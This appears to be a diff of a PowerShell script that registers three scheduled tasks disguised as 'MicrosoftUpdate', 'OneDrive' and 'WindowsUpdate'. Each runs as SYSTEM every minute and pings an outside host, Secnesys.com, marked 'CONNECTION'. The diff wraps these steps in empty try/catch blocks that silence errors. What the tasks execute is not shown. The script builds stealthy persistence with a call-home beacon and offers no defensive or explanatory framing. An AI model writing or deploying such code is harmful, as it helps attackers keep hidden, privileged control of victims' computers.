@@ -35,25 +35,36 @@ function Gen-Info {
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
     
     $task_alfa = "MicrosoftUpdate"
-    if (-not (Get-ScheduledTask -TaskName $task_alfa -ErrorAction SilentlyContinue)) {
-        # CONNECTION
-        Test-Connection -ComputerName Secnesys.com -Count 1
-        Register-ScheduledTask -TaskName $task_alfa -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
-    }
+    try{
+        if (-not (Get-ScheduledTask -TaskName $task_alfa -ErrorAction SilentlyContinue)) {
+            Register-ScheduledTask -TaskName $task_alfa -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
+            
+            # CONNECTION
+            Test-Connection -ComputerName Secnesys.com -Count 1
+        }
+    } catch {}
     
     $task_bravo = "OneDrive"
-    if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
-        # CONNECTION
-        Test-Connection -ComputerName Secnesys.com -Count 1
-        Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
-    }
+    try{
+        if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
+            Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
+
+            # CONNECTION
+            Test-Connection -ComputerName Secnesys.com -Count 1
+        }
+    } catch {} 
+    
     
     $task_charlie = "WindowsUpdate"
-    if (-not (Get-ScheduledTask -TaskName $task_charlie -ErrorAction SilentlyContinue)) {
-        # CONNECTION
-        Test-Connection -ComputerName Secnesys.com -Count 1
-        Register-ScheduledTask -TaskName $task_charlie -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
-    }
+    try{
+        if (-not (Get-ScheduledTask -TaskName $task_charlie -ErrorAction SilentlyContinue)) {
+            Register-ScheduledTask -TaskName $task_charlie -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
+
+            # CONNECTION
+            Test-Connection -ComputerName Secnesys.com -Count 1
+        }
+    } catch {} 
+    
 }
 
 Gen-Info
